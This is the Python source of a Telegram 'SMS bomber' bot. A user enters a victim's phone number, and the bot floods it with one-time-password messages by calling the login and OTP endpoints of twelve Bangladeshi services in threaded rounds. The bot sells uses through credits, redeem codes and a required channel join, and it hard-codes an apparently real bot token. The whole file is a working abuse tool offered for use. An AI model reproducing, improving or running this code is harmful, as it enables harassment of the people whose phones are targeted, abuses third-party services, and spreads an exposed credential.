import telebot
import requests
import threading
import time
import os
import json
import random
import string
from flask import Flask
from telebot import types

# ==========================================
# 🌐 WEB SERVER (For Render)
# ==========================================
app = Flask('')
@app.route('/')
def home(): return "Multi-Bomb Engine Online!"

def run_web_server():
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)

def keep_alive():
    threading.Thread(target=run_web_server, daemon=True).start()

# ==========================================
# 🔧 CONFIGURATION
# ==========================================
API_TOKEN = '8577991344:AAFyp9TUo-BrzgUpO1ZRoy6fjnc41hBG4GM'  
OWNER_ID = 6941003064              # Apnar Numeric ID boshon
OWNER_NAME = "Suptho Hpd"
CHANNEL_ID = "@SH_tricks"         
DATA_FILE = 'bot_db.json'

bot = telebot.TeleBot(API_TOKEN)

# ==========================================
# 💾 DATABASE MANAGER
# ==========================================
def load_data():
    if not os.path.exists(DATA_FILE):
        return {"users": {}, "codes": [], "whitelist": [], "banned": []}
    try:
        with open(DATA_FILE, 'r') as f: return json.load(f)
    except: return {"users": {}, "codes": [], "whitelist": [], "banned": []}

def save_data(data):
    with open(DATA_FILE, 'w') as f: json.dump(data, f, indent=4)

db = load_data()

# ==========================================
# 🚀 API ENGINE (Extreme Fast)
# ==========================================
def api_hit(url, method, data=None, json_data=None):
    try:
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
        if method == "POST":
            requests.post(url, data=data, json=json_data, headers=headers, timeout=3)
        else:
            requests.get(url, headers=headers, timeout=3)
    except: pass

def start_bombing_engine(target, amount):
    # API List
    apis = [
        lambda: api_hit("https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web", "POST", json_data={"number": "+88"+target}),
        lambda: api_hit(f"https://www.bioscopelive.com/en/login/send-otp?phone=88{target}", "GET"),
        lambda: api_hit(f"https://api.hoichoi.tv/users/otp?phone={target}&country_code=880", "GET"),
        lambda: api_hit("https://api.apex4u.com/api/auth/login", "POST", json_data={"phoneNumber": target}),
        lambda: api_hit("https://shopbasebd.com/store/registration/sendOTP", "POST", data={"number": target, "_token": "ktrqcmKSAn8cP3vZvw3xkbav2ww65eRvaikWKDFo"}),
        lambda: api_hit("https://web-api.banglalink.net/api/v1/user/otp-login/request", "POST", json_data={"mobile": target}),
        lambda: api_hit("https://webloginda.grameenphone.com/backend/api/v1/otp", "POST", data={"msisdn": target}),
        lambda: api_hit(f"https://api.shadhinmusic.com/api/v1/auth/otp?phone={target}", "GET"),
        lambda: api_hit("https://api.shikho.com/auth/v2/send/sms", "POST", json_data={"phone": "88"+target, "type": "student"}),
        lambda: api_hit("https://api.ostad.app/api/v2/user/with-otp", "POST", json_data={"msisdn": target}),
        lambda: api_hit("https://api.swap.com.bd/api/v1/send-otp", "POST", json_data={"phone": target}),
        lambda: api_hit(f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={target}", "GET")
    ]

    # Loop logic (Amount = Koibar sob API hit korbe)
    for _ in range(amount):
        for run_api in apis:
            threading.Thread(target=run_api).start()
        time.sleep(1) # Protiti round er majhe 1 second gap jate block na hoy

# ==========================================
# 🤖 BOT HANDLERS
# ==========================================
def is_joined(user_id):
    try:
        res = bot.get_chat_member(CHANNEL_ID, user_id)
        return res.status in ['member', 'administrator', 'creator']
    except: return False

@bot.message_handler(commands=['start'])
def welcome(message):
    uid = str(message.from_user.id)
    if uid not in db['users']:
        db['users'][uid] = {"credits": 5}
        save_data(db)
    
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add("🚀 Start Bomb", "💳 My Balance", "👥 Refer & Earn", "💰 Redeem Credit")
    bot.send_message(message.chat.id, "🔥 **SUPTHO BOMBER VIP** 🔥\nAmount 1 = Sob API theke 1ti SMS.", reply_markup=markup)

@bot.message_handler(commands=['admin', 'gencodes', 'stats'])
def admin_panel(message):
    if message.from_user.id != OWNER_ID: return
    cmd = message.text.split()
    if cmd[0] == '/admin':
        bot.send_message(message.chat.id, "👑 Admin commands: `/stats`, `/gencodes 10`")
    elif cmd[0] == '/stats':
        bot.reply_to(message, f"📊 Users: {len(db['users'])}\n🎟️ Codes: {len(db['codes'])}")
    elif cmd[0] == '/gencodes':
        num = int(cmd[1])
        codes = ["SUP-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=7)) for _ in range(num)]
        db['codes'].extend(codes); save_data(db)
        bot.reply_to(message, f"✅ Codes: `{', '.join(codes)}`")

@bot.message_handler(func=lambda m: True)
def handle_buttons(message):
    uid = str(message.from_user.id)
    if not is_joined(message.from_user.id):
        return bot.reply_to(message, f"❌ Join {CHANNEL_ID} first!")

    if message.text == "🚀 Start Bomb":
        msg = bot.reply_to(message, "💣 Target Number (11 Digit):")
        bot.register_next_step_handler(msg, ask_amount)
    elif message.text == "💳 My Balance":
        cred = "Unlimited" if int(uid) == OWNER_ID else db['users'].get(uid, {}).get('credits', 0)
        bot.reply_to(message, f"💰 Balance: {cred} Credits")

def ask_amount(message):
    target = message.text.strip()
    if len(target) != 11: return bot.reply_to(message, "❌ Wrong Number!")
    msg = bot.reply_to(message, f"🎯 Target: {target}\n🔢 Round Amount (Max 10):")
    bot.register_next_step_handler(msg, process_bomb, target)

def process_bomb(message, target):
    uid = str(message.from_user.id)
    try:
        amount = int(message.text)
        if amount > 10: amount = 10 # Safety limit
        
        if int(uid) != OWNER_ID:
            if db['users'][uid]['credits'] < 1: return bot.reply_to(message, "⚠️ No Credits!")
            db['users'][uid]['credits'] -= 1; save_data(db)
        
        bot.send_message(message.chat.id, f"🚀 **Attack Launched!**\nTarget: {target}\nRounds: {amount}")
        threading.Thread(target=start_bombing_engine, args=(target, amount)).start()
        
    except: bot.reply_to(message, "❌ Error.")

if __name__ == "__main__":
    try: bot.remove_webhook()
    except: pass
    keep_alive()
    bot.polling(non_stop=True)
